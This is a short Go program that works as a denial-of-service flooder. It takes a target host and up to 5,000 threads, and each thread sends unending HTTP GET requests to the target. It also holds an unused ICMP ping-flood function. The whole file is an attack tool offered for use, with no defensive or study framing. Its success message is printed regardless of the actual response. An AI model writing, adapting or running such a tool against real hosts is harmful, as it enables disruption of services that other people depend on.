package main

import (
	"fmt"
	"github.com/sparrc/go-ping"
	"net/http"
	"os"
	"strconv"
	"sync"
	"log"
)

var (
	wg sync.WaitGroup
)

const (
	threadLimit = 5000
)

func main() {
	target, threads := parseArgs()

	fmt.Println("Attacking " + target + "...")
	for i := 0; i < threads; i++ {
		wg.Add(1)
		go httpGetFlood(target, &wg)
	}
	wg.Wait()
}

func parseArgs() (target string, numbOfThreads int) {
	if len(os.Args) != 3 {
		fmt.Println("Error: Wrong arguements passed")
		fmt.Println()
		fmt.Println(`Usage: <host> <threads>`)
		
		fmt.Println(`Example: www.mysite.com 100`)
		fmt.Println()

		os.Exit(1)
	}

	target = os.Args[1]
	numbOfThreads, _ = strconv.Atoi(os.Args[2])

	if (areNumberOfThreadsValid(numbOfThreads)) == false {
		fmt.Println("Error: The number of threads you enter exceeds the limit; ", threadLimit)
		os.Exit(1)
	}

	return target, numbOfThreads
}

func areNumberOfThreadsValid(threads int) bool {
	threads = int(threads)

	if threads > threadLimit {
		return false
	}
	return true
}

func icmpFlood(target string) {
	pinger, err := ping.NewPinger(target)

	if err != nil {
		fmt.Println("Error: Failed to ping host")
		os.Exit(1)
	}

	pinger.Count = 65500 	// Packets to send
	pinger.Run()         	// Blocks until complete

	wg.Done() 				// Decrement thread counter once complete
	fmt.Println("Ping Complete.")
}

func httpGetFlood(target string, wg *sync.WaitGroup) {
	for {
		_, err := http.Get(target)

		if err != nil {
			log.Println(err)
		}
		
		fmt.Println("Target Hit - 200")
	}
	wg.Done()
}
